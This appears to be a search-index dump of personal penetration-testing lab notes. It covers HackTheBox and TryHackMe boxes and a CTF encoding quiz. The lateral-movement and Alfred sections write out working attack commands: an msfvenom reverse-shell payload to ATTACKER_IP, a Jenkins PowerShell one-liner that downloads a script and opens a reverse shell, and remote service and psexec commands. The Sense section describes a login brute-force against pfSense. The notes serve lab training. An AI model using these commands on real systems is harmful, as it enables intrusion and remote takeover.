10.10.10.161 -d htb.local -u users.txt -p /usr/share/seclists/Passwords/darkweb2017-top100.txt The domain is htb.local","title":"Public exploits"},{"location":"OSCP%20practice%20exam/5.%20Sauna/","text":"10.10.10.175 \u00b6 Recon \u00b6 Port Scan \u00b6 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Egotistical Bank :: Home 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-02-04 01:08:30Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49669/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49673/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49677/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49689/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49696/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Enumerate attack surface \u00b6 This box also appears to be AD based domain controller. DNS - 53: Simple DNS Plus Active Directory - 88: Kerberos - 389: LDAP - 636: LDAPs - 464: kpasswd5 SMB - 139: netbios-ssn - 445: microsoft-ds - various RPC ports Webserver - 80: Microsoft IIS 10.0 - Bootstrap 4.0.0 200 640l 1767w 30954c http://10.10.10.175/About.html 200 470l 1279w 24695c http://10.10.10.175/Blog.html 200 325l 770w 15634c http://10.10.10.175/Contact.html 301 2l 10w 150c http://10.10.10.175/Images 200 683l 1813w 32797c http://10.10.10.175/Index.html 200 640l 1767w 30954c http://10.10.10.175/about.html 200 470l 1279w 24695c http://10.10.10.175/blog.html 200 325l 770w 15634c http://10.10.10.175/contact.html 301 2l 10w 147c http://10.10.10.175/css 301 2l 10w 149c http://10.10.10.175/fonts 301 2l 10w 150c http://10.10.10.175/images 200 683l 1813w 32797c http://10.10.10.175/index.html 200 684l 1814w 38059c http://10.10.10.175/single.html Others - 593: Microsoft RPC over HTTP 1.0 - 9389: .Net Message Framing - 5985: Microsoft HTTPAPI httpd 2.0 - WinRM? Check _manual_commands.txt - 49673: Microsoft RCP over HTTP 1.0 Public Exploits \u00b6","title":"10.10.10.175"},{"location":"OSCP%20practice%20exam/5.%20Sauna/#101010175","text":"","title":"10.10.10.175"},{"location":"OSCP%20practice%20exam/5.%20Sauna/#recon","text":"","title":"Recon"},{"location":"OSCP%20practice%20exam/5.%20Sauna/#port-scan","text":"PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Egotistical Bank :: Home 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-02-04 01:08:30Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49669/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49673/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49677/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49689/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49696/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host","title":"Port Scan"},{"location":"OSCP%20practice%20exam/5.%20Sauna/#enumerate-attack-surface","text":"This box also appears to be AD based domain controller. DNS - 53: Simple DNS Plus Active Directory - 88: Kerberos - 389: LDAP - 636: LDAPs - 464: kpasswd5 SMB - 139: netbios-ssn - 445: microsoft-ds - various RPC ports Webserver - 80: Microsoft IIS 10.0 - Bootstrap 4.0.0 200 640l 1767w 30954c http://10.10.10.175/About.html 200 470l 1279w 24695c http://10.10.10.175/Blog.html 200 325l 770w 15634c http://10.10.10.175/Contact.html 301 2l 10w 150c http://10.10.10.175/Images 200 683l 1813w 32797c http://10.10.10.175/Index.html 200 640l 1767w 30954c http://10.10.10.175/about.html 200 470l 1279w 24695c http://10.10.10.175/blog.html 200 325l 770w 15634c http://10.10.10.175/contact.html 301 2l 10w 147c http://10.10.10.175/css 301 2l 10w 149c http://10.10.10.175/fonts 301 2l 10w 150c http://10.10.10.175/images 200 683l 1813w 32797c http://10.10.10.175/index.html 200 684l 1814w 38059c http://10.10.10.175/single.html Others - 593: Microsoft RPC over HTTP 1.0 - 9389: .Net Message Framing - 5985: Microsoft HTTPAPI httpd 2.0 - WinRM? Check _manual_commands.txt - 49673: Microsoft RCP over HTTP 1.0","title":"Enumerate attack surface"},{"location":"OSCP%20practice%20exam/5.%20Sauna/#public-exploits","text":"","title":"Public Exploits"},{"location":"OSCP%20practice%20exam/6.%20Sense/","text":"10.10.10.60 \u00b6 Recon \u00b6 Port Scan \u00b6 PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 443/tcp open ssl/http lighttpd 1.4.35 Enumerate attack surface \u00b6 Webserver - 80: lighttpd 1.4.35 (http) - 443: lighttpd 1.4.35 (https) Public exploits. \u00b6 A closer look at the webserver \u00b6 pfSense? Is that you? Findings from the scan. \u2514\u2500$ cat */*ferox* | grep -E '^200' | sort -u 200 10l 40w 271c https://10.10.10.60/changelog.txt 200 173l 425w 0c https://10.10.10.60/ 200 173l 425w 0c https://10.10.10.60/edit.php 200 173l 425w 0c https://10.10.10.60/exec.php 200 173l 425w 0c https://10.10.10.60/graph.php 200 173l 425w 0c https://10.10.10.60/help.php 200 173l 425w 0c https://10.10.10.60/index.php 200 173l 425w 0c https://10.10.10.60/interfaces.php 200 173l 425w 0c https://10.10.10.60/license.php 200 173l 425w 0c https://10.10.10.60/pkg.php 200 173l 425w 0c https://10.10.10.60/stats.php 200 173l 425w 0c https://10.10.10.60/status.php 200 173l 425w 0c https://10.10.10.60/system.php 200 173l 425w 0c https://10.10.10.60/wizard.php 200 17l 26w 384c https://10.10.10.60/xmlrpc.php 200 24l 32w 329c https://10.10.10.60/index.html 200 7l 24w 1406c https://10.10.10.60/favicon.ico Most of those pages were behind a login page. I could only access - changelog.txt - which mentions a recent patch FAILED, only patches 2 of 3 vulnerabilities. xmlrpc.php - which shows some XML error (probably because I'm doing a get request and it's expecting a POST with some command.) Following HackTricks guide to xmlrpc I was able to get a list of valid commands. This can be used to brute-force creds if needed. Do a POST with this payload: <methodCall> <methodName>system.listMethods</methodName> <params></params> </methodCall> While researching how to use pfsense's XMLRPC, I came across this exploit . The exploit requires credentials, but grants RCE . More about this weakness at NVD It looks like the exploit is using this XML payload to check the credential (only password I guess?). <?xml version='1.0' encoding='iso-8859-1'?>\" <methodCall> <methodName>pfsense.host_firmware_version</methodName> <params> <param><value><string>PASSWORD_HERE</string></value></param> </params> </methodCall> So I will check this, and brute-force if possible. Appears to be working! (Incorrect password) Now for the brute-force.... Well, that was short lived. 75 requests worked, but now everything is timing out. In fact, it appears the whole webserver is down now. Wait....duh....my IP is probably deny-listed :'( Reverting...Will have to do something different for the brute-force attack. I could try the name of the box as the password... Also just noticed, lighttpd has some DOS vulnerability, apparently the requests are just going to quickly for it to handle. If I slow them down maybe my brute force will get past 80 requests :) index.html - which has a link to install Dragon Fly BSD I crashed the damn thing again.... Moving to another box, may have to revert this when I come back - sort of jumped right in and skipped enumerating the attack surface, maybe take a step back when I come back to it. After reverting, and scouring the internet, the above screenshot seems to be tied to v 2.1.5 of pfsense. ] After reviewing the exploits on here, I've come full circle. I'm back at the XMLRPC exploit, but I still need credentials. Maybe I can modify the python exploit to brute force as well. Downloading this exploit Split the file: lines 1-90 in info.txt and 91+ in pfsense-rce.py This still isn't working.....maybe I can bypass the session thing on longin page using burp. I found some notes about using Intruder to update dynamic session values during a brute force, this may be the ticket. Identifying changing values \u00b6 Reply 31 \u00b6 set cookie_test set __csrf_magic Request 32 \u00b6 updated cookie_test updated __csrf_magic is URL encoded Using Burp Intruder, with the following positions set, username is always admin : Then set up Grep - Extract in Options to get around the session management: Now to set payloads: Note: for payload 2, I've added , to the Payload Encoding char list. For the wordlist, I've decided to use rockyou.txt - this has stalled burp while it loads Trying to run this is causing my CPU to spike pretty heavily - - Times up....","title":"10.10.10.60"},{"location":"OSCP%20practice%20exam/6.%20Sense/#10101060","text":"","title":"10.10.10.60"},{"location":"OSCP%20practice%20exam/6.%20Sense/#recon","text":"","title":"Recon"},{"location":"OSCP%20practice%20exam/6.%20Sense/#port-scan","text":"PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 443/tcp open ssl/http lighttpd 1.4.35","title":"Port Scan"},{"location":"OSCP%20practice%20exam/6.%20Sense/#enumerate-attack-surface","text":"Webserver - 80: lighttpd 1.4.35 (http) - 443: lighttpd 1.4.35 (https)","title":"Enumerate attack surface"},{"location":"OSCP%20practice%20exam/6.%20Sense/#public-exploits","text":"","title":"Public exploits."},{"location":"OSCP%20practice%20exam/6.%20Sense/#a-closer-look-at-the-webserver","text":"pfSense? Is that you? Findings from the scan. \u2514\u2500$ cat */*ferox* | grep -E '^200' | sort -u 200 10l 40w 271c https://10.10.10.60/changelog.txt 200 173l 425w 0c https://10.10.10.60/ 200 173l 425w 0c https://10.10.10.60/edit.php 200 173l 425w 0c https://10.10.10.60/exec.php 200 173l 425w 0c https://10.10.10.60/graph.php 200 173l 425w 0c https://10.10.10.60/help.php 200 173l 425w 0c https://10.10.10.60/index.php 200 173l 425w 0c https://10.10.10.60/interfaces.php 200 173l 425w 0c https://10.10.10.60/license.php 200 173l 425w 0c https://10.10.10.60/pkg.php 200 173l 425w 0c https://10.10.10.60/stats.php 200 173l 425w 0c https://10.10.10.60/status.php 200 173l 425w 0c https://10.10.10.60/system.php 200 173l 425w 0c https://10.10.10.60/wizard.php 200 17l 26w 384c https://10.10.10.60/xmlrpc.php 200 24l 32w 329c https://10.10.10.60/index.html 200 7l 24w 1406c https://10.10.10.60/favicon.ico Most of those pages were behind a login page. I could only access - changelog.txt - which mentions a recent patch FAILED, only patches 2 of 3 vulnerabilities. xmlrpc.php - which shows some XML error (probably because I'm doing a get request and it's expecting a POST with some command.) Following HackTricks guide to xmlrpc I was able to get a list of valid commands. This can be used to brute-force creds if needed. Do a POST with this payload: <methodCall> <methodName>system.listMethods</methodName> <params></params> </methodCall> While researching how to use pfsense's XMLRPC, I came across this exploit . The exploit requires credentials, but grants RCE . More about this weakness at NVD It looks like the exploit is using this XML payload to check the credential (only password I guess?). <?xml version='1.0' encoding='iso-8859-1'?>\" <methodCall> <methodName>pfsense.host_firmware_version</methodName> <params> <param><value><string>PASSWORD_HERE</string></value></param> </params> </methodCall> So I will check this, and brute-force if possible. Appears to be working! (Incorrect password) Now for the brute-force.... Well, that was short lived. 75 requests worked, but now everything is timing out. In fact, it appears the whole webserver is down now. Wait....duh....my IP is probably deny-listed :'( Reverting...Will have to do something different for the brute-force attack. I could try the name of the box as the password... Also just noticed, lighttpd has some DOS vulnerability, apparently the requests are just going to quickly for it to handle. If I slow them down maybe my brute force will get past 80 requests :) index.html - which has a link to install Dragon Fly BSD I crashed the damn thing again.... Moving to another box, may have to revert this when I come back - sort of jumped right in and skipped enumerating the attack surface, maybe take a step back when I come back to it. After reverting, and scouring the internet, the above screenshot seems to be tied to v 2.1.5 of pfsense. ] After reviewing the exploits on here, I've come full circle. I'm back at the XMLRPC exploit, but I still need credentials. Maybe I can modify the python exploit to brute force as well. Downloading this exploit Split the file: lines 1-90 in info.txt and 91+ in pfsense-rce.py This still isn't working.....maybe I can bypass the session thing on longin page using burp. I found some notes about using Intruder to update dynamic session values during a brute force, this may be the ticket.","title":"A closer look at the webserver"},{"location":"OSCP%20practice%20exam/6.%20Sense/#identifying-changing-values","text":"","title":"Identifying changing values"},{"location":"OSCP%20practice%20exam/6.%20Sense/#reply-31","text":"set cookie_test set __csrf_magic","title":"Reply 31"},{"location":"OSCP%20practice%20exam/6.%20Sense/#request-32","text":"updated cookie_test updated __csrf_magic is URL encoded Using Burp Intruder, with the following positions set, username is always admin : Then set up Grep - Extract in Options to get around the session management: Now to set payloads: Note: for payload 2, I've added , to the Payload Encoding char list. For the wordlist, I've decided to use rockyou.txt - this has stalled burp while it loads Trying to run this is causing my CPU to spike pretty heavily - - Times up....","title":"Request 32"},{"location":"Other%20CTFs/Quiz%207/","text":"Shout out to c\u00e4esura , here is the writeup as promised! I'll add to it if we ever figure out the final answer. Quiz 7 contains 2 parts part 1 \u2822\u2816\u2832\u2836\u2816\u2826\u2816\u2809\u2832\u2814\u2832\u2826\u2832\u2806\u2816\u2826\u2816\u2812\u2812\u2812\u2832\u2811\u2812\u2812\u2816\u2806\u2812\u2812\u2832\u2801\u2816\u2803\u2832\u2814\u2832\u2836\u2832\u2816\u2836\u2822\u2822\u2801\u2832\u2812\u2832\u2806\u2832\u2801\u2822\u2816\u2816\u2814\u2832\u2806\u2816\u2826\u2816\u2812\u2816\u2819\u2822\u2822\u2816\u2836\u2832\u2814\u2816\u2811\u2832\u2806\u2816\u2826\u2816\u2812\u2812\u2812\u2832\u2811\u2812\u2812\u2816\u2806\u2812\u2812\u2832\u2801\u2816\u2803\u2816\u2812\u2832\u2836\u2832\u2816\u2836\u2801\u2816\u2812\u2812\u2812\u2816\u2832\u2836\u2816\u2816\u2812\u2816\u2819\u2822\u2802\u2816\u2814 and part 2 ..-. ----- ..--- -.-. ...-- ---.. ..... ---.. ----- ...-- .- ..--- ..... -... ..-. --... -.-. ..--- ..--- --... ..-. ...-- .---- -.... .- -.-. . -.. .---- ---.. .---- ....- --... ----. -.-. -.. ...-- ..-. ----. ----- ...-- -... ---.. -.... -.. . ...-- . -... -.... ...-- -.. .- ----- -.. -.-. . . .- ..--- ..-. --... -.. .---- For this quiz we will be using Cyber Chef , which is a great resource for chaining together different ciphers or encodings in real time. Part 1 \u00b6 Challenge \u00b6 The challenge is to decode this: \u2822\u2816\u2832\u2836\u2816\u2826\u2816\u2809\u2832\u2814\u2832\u2826\u2832\u2806\u2816\u2826\u2816\u2812\u2812\u2812\u2832\u2811\u2812\u2812\u2816\u2806\u2812\u2812\u2832\u2801\u2816\u2803\u2832\u2814\u2832\u2836\u2832\u2816\u2836\u2822\u2822\u2801\u2832\u2812\u2832\u2806\u2832\u2801\u2822\u2816\u2816\u2814\u2832\u2806\u2816\u2826\u2816\u2812\u2816\u2819\u2822\u2822\u2816\u2836\u2832\u2814\u2816\u2811\u2832\u2806\u2816\u2826\u2816\u2812\u2812\u2812\u2832\u2811\u2812\u2812\u2816\u2806\u2812\u2812\u2832\u2801\u2816\u2803\u2816\u2812\u2832\u2836\u2832\u2816\u2836\u2801\u2816\u2812\u2812\u2812\u2816\u2832\u2836\u2816\u2816\u2812\u2816\u2819\u2822\u2802\u2816\u2814 The characters look familiar, and I just happened to remember that this is braille. Cyber Chef was able to make easy work of converting the braille to ASCII characters with the From Braille ingredient. 5647686C4948426863334E3362334A6B494746755A43424A56694268636D5567496E426863334E3362334A6B6347467A63336476636D5169 The ASCII output (above) doesn't immediately look familiar. However, after looking at it for a few minutes I realized the character set matches up with Hexidecimal; this is just poorly formatted with no delimeter. We add the From Hex ingredient to our recipe and set the Delimeter to None . Our output is now: VGhlIHBhc3N3b3JkIGFuZCBJViBhcmUgInBhc3N3b3JkcGFzc3dvcmQi This resembles base 64 encoding, so lets try that out in the recipe, and VOILA! A cake. Answer \u00b6 Our answer to part 1 is The password and IV are \"passwordpassword\" Part 2 \u00b6 Challenge \u00b6 ..-. ----- ..--- -.-. ...-- ---.. ..... ---.. ----- ...-- .- ..--- ..... -... ..-. --... -.-. ..--- ..--- --... ..-. ...-- .---- -.... .- -.-. . -.. .---- ---.. .---- ....- --... ----. -.-. -.. ...-- ..-. ----. ----- ...-- -... ---.. -.... -.. . ...-- . -... -.... ...-- -.. .- ----- -.. -.-. . . .- ..--- ..-. --... -.. .---- This part is incomplete, but at first glance I noticed the charset seemed to match written morse code. The dots are \"shorts\" and lines are \"longs\". The space is a delim between characters. Incomplete answer \u00b6 F02C385803A25BF7C227F316ACED181479CD3F903B86DE3EB63DA0DCEEA2F7D1 So, we decoded to this string, and have a password and IV which are both passwordpassword . If we were able to identify which cipher was used we would be able to decode this string further. Until then!","title":"Quiz 7"},{"location":"Other%20CTFs/Quiz%207/#part-1","text":"","title":"Part 1"},{"location":"Other%20CTFs/Quiz%207/#challenge","text":"The challenge is to decode this: \u2822\u2816\u2832\u2836\u2816\u2826\u2816\u2809\u2832\u2814\u2832\u2826\u2832\u2806\u2816\u2826\u2816\u2812\u2812\u2812\u2832\u2811\u2812\u2812\u2816\u2806\u2812\u2812\u2832\u2801\u2816\u2803\u2832\u2814\u2832\u2836\u2832\u2816\u2836\u2822\u2822\u2801\u2832\u2812\u2832\u2806\u2832\u2801\u2822\u2816\u2816\u2814\u2832\u2806\u2816\u2826\u2816\u2812\u2816\u2819\u2822\u2822\u2816\u2836\u2832\u2814\u2816\u2811\u2832\u2806\u2816\u2826\u2816\u2812\u2812\u2812\u2832\u2811\u2812\u2812\u2816\u2806\u2812\u2812\u2832\u2801\u2816\u2803\u2816\u2812\u2832\u2836\u2832\u2816\u2836\u2801\u2816\u2812\u2812\u2812\u2816\u2832\u2836\u2816\u2816\u2812\u2816\u2819\u2822\u2802\u2816\u2814 The characters look familiar, and I just happened to remember that this is braille. Cyber Chef was able to make easy work of converting the braille to ASCII characters with the From Braille ingredient. 5647686C4948426863334E3362334A6B494746755A43424A56694268636D5567496E426863334E3362334A6B6347467A63336476636D5169 The ASCII output (above) doesn't immediately look familiar. However, after looking at it for a few minutes I realized the character set matches up with Hexidecimal; this is just poorly formatted with no delimeter. We add the From Hex ingredient to our recipe and set the Delimeter to None . Our output is now: VGhlIHBhc3N3b3JkIGFuZCBJViBhcmUgInBhc3N3b3JkcGFzc3dvcmQi This resembles base 64 encoding, so lets try that out in the recipe, and VOILA! A cake.","title":"Challenge"},{"location":"Other%20CTFs/Quiz%207/#answer","text":"Our answer to part 1 is The password and IV are \"passwordpassword\"","title":"Answer"},{"location":"Other%20CTFs/Quiz%207/#part-2","text":"","title":"Part 2"},{"location":"Other%20CTFs/Quiz%207/#challenge_1","text":"..-. ----- ..--- -.-. ...-- ---.. ..... ---.. ----- ...-- .- ..--- ..... -... ..-. --... -.-. ..--- ..--- --... ..-. ...-- .---- -.... .- -.-. . -.. .---- ---.. .---- ....- --... ----. -.-. -.. ...-- ..-. ----. ----- ...-- -... ---.. -.... -.. . ...-- . -... -.... ...-- -.. .- ----- -.. -.-. . . .- ..--- ..-. --... -.. .---- This part is incomplete, but at first glance I noticed the charset seemed to match written morse code. The dots are \"shorts\" and lines are \"longs\". The space is a delim between characters.","title":"Challenge"},{"location":"Other%20CTFs/Quiz%207/#incomplete-answer","text":"F02C385803A25BF7C227F316ACED181479CD3F903B86DE3EB63DA0DCEEA2F7D1 So, we decoded to this string, and have a password and IV which are both passwordpassword . If we were able to identify which cipher was used we would be able to decode this string further. Until then!","title":"Incomplete answer"},{"location":"TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/","text":"Pivoting and lateral movement \u00b6 allan.wilkinson Xhlb3351 Lateral movement is bouncing between different hosts on the network. With each new host owned, more credentials and access may be available, which may lead to more boxes owned. This cycle of enumerating access on the network is called lateral movement and it is a cyclical process like port/service enumeration. It's important to know the difference between administrator types: - Local accounts in the local Administrator group - Remote access is limited with medium level integrity token. (minus build in Administrator account) - Domain accounts in the local Administrators group Remote commands \u00b6 Psexec \u00b6 Port 445 Requires Administrators group membership psexec64.exe \\\\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe WinRM \u00b6 Port 5985, 5986 Requires Remote Management Users group membership winrs.exe -u:Administrator -p:Mypass123 -r:target cmd $username = 'Administrator'; $password = 'Mypass123'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; # interactive session Enter-PSSession -Computername TARGET -Credential $credential # single commands Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami} SC \u00b6 Port 135, 139, 445 Requires Administrators group membership create an exe-service payload with msfvenom msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe copy the binary file over using SMB smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA.TRYHACKME.COM '//thmiis.za.tryhackme.com/admin$/' set up a listener msfconsole -q -x \"use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit\" # Create a service sc.exe \\\\TARGET create THMservice binPath= \"net user munra Pass123 /add\" start= auto # Start the service sc.exe \\\\TARGET start THMservice # stop the service sc.exe \\\\TARGET stop THMservice # delete the service sc.exe \\\\TARGET delete THMservice Scheduled Tasks \u00b6 # Create a scheduled task schtasks /s TARGET /RU \"SYSTEM\" /create /tn \"THMtask1\" /tr \"<command/payload to execute>\" /sc ONCE /sd 01/01/1970 /st 00:00 # Run the scheduled task schtasks /s TARGET /run /TN \"THMtask1\" # Delete a scheduled task schtasks /S TARGET /TN \"THMtask1\" /DELETE /F","title":"Pivoting and lateral movement"},{"location":"TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#pivoting-and-lateral-movement","text":"allan.wilkinson Xhlb3351 Lateral movement is bouncing between different hosts on the network. With each new host owned, more credentials and access may be available, which may lead to more boxes owned. This cycle of enumerating access on the network is called lateral movement and it is a cyclical process like port/service enumeration. It's important to know the difference between administrator types: - Local accounts in the local Administrator group - Remote access is limited with medium level integrity token. (minus build in Administrator account) - Domain accounts in the local Administrators group","title":"Pivoting and lateral movement"},{"location":"TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#remote-commands","text":"","title":"Remote commands"},{"location":"TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#psexec","text":"Port 445 Requires Administrators group membership psexec64.exe \\\\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe","title":"Psexec"},{"location":"TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#winrm","text":"Port 5985, 5986 Requires Remote Management Users group membership winrs.exe -u:Administrator -p:Mypass123 -r:target cmd $username = 'Administrator'; $password = 'Mypass123'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; # interactive session Enter-PSSession -Computername TARGET -Credential $credential # single commands Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}","title":"WinRM"},{"location":"TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#sc","text":"Port 135, 139, 445 Requires Administrators group membership create an exe-service payload with msfvenom msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe copy the binary file over using SMB smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA.TRYHACKME.COM '//thmiis.za.tryhackme.com/admin$/' set up a listener msfconsole -q -x \"use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit\" # Create a service sc.exe \\\\TARGET create THMservice binPath= \"net user munra Pass123 /add\" start= auto # Start the service sc.exe \\\\TARGET start THMservice # stop the service sc.exe \\\\TARGET stop THMservice # delete the service sc.exe \\\\TARGET delete THMservice","title":"SC"},{"location":"TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#scheduled-tasks","text":"# Create a scheduled task schtasks /s TARGET /RU \"SYSTEM\" /create /tn \"THMtask1\" /tr \"<command/payload to execute>\" /sc ONCE /sd 01/01/1970 /st 00:00 # Run the scheduled task schtasks /s TARGET /run /TN \"THMtask1\" # Delete a scheduled task schtasks /S TARGET /TN \"THMtask1\" /DELETE /F","title":"Scheduled Tasks"},{"location":"TryHackMe/Alfred/","text":"Alfred \u00b6 Jenkins 2.190.1 RCE can be accomplished by creating a project (too noisy) or by using the Groovy Script - this skeleton script was pulled from HackTricks (https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins) Proof of concept \u00b6 The above picture shows that RCE is possible. Exploit \u00b6 Hacktricks said we can use this: \u00b6 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port Tailored to our situation: \u00b6 \"powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.73.217:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.73.217 -Port 4444\".execute() Attack Box Host the Invoke-PowerShellTcp.ps1 file cd LOCATION_OF_PS1FILE python -m http.server 9000 Start a nc listener on 4444 nc -nvlp 4444 Jenkins UI : go to http://ip:port/scripts Use credential admin : admin if necessary Paste modified script from above. Click Run Boom, we got shell \u00b6 User Flag \u00b6 79007a09481963edf2e1321abd9ae2a0 dff0f748678f280250f25a45b8046b4a","title":"Alfred"},{"location":"TryHackMe/Alfred/#alfred","text":"Jenkins 2.190.1 RCE can be accomplished by creating a project (too noisy) or by using the Groovy Script - this skeleton script was pulled from HackTricks (https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins)","title":"Alfred"},{"location":"TryHackMe/Alfred/#proof-of-concept","text":"The above picture shows that RCE is possible.","title":"Proof of concept"},{"location":"TryHackMe/Alfred/#exploit","text":"","title":"Exploit"},{"location":"TryHackMe/Alfred/#hacktricks-said-we-can-use-this","text":"powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port","title":"Hacktricks said we can use this:"},{"location":"TryHackMe/Alfred/#tailored-to-our-situation","text":"\"powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.73.217:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.73.217 -Port 4444\".execute() Attack Box Host the Invoke-PowerShellTcp.ps1 file cd LOCATION_OF_PS1FILE python -m http.server 9000 Start a nc listener on 4444 nc -nvlp 4444 Jenkins UI : go to http://ip:port/scripts Use credential admin : admin if necessary Paste modified script from above. Click Run","title":"Tailored to our situation:"},{"location":"TryHackMe/Alfred/#boom-we-got-shell","text":"","title":"Boom, we got shell"},{"location":"TryHackMe/Alfred/#user-flag","text":"79007a09481963edf2e1321abd9ae2a0 dff0f748678f280250f25a45b8046b4a","title":"User Flag"},{"location":"TryHackMe/Blueprint/","text":"Blueprint \u00b6 This one is a windows box with minimal hints. Port scan \u00b6 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 7.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: 404 - File or directory not found. |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 443/tcp open ssl/http syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) | http-methods: | Supported Methods: GET HEAD POST OPTIONS TRACE |_ Potentially risky methods: TRACE |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | ssl-cert: Subject: commonName=localhost | Issuer: commonName=localhost | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2009-11-10T23:48:47 | Not valid after: 2019-11-08T23:48:47 | MD5: a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0 | SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6 445/tcp open microsoft-ds syn-ack ttl 125 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql syn-ack ttl 125 MariaDB (unauthorized) 5172/tcp filtered 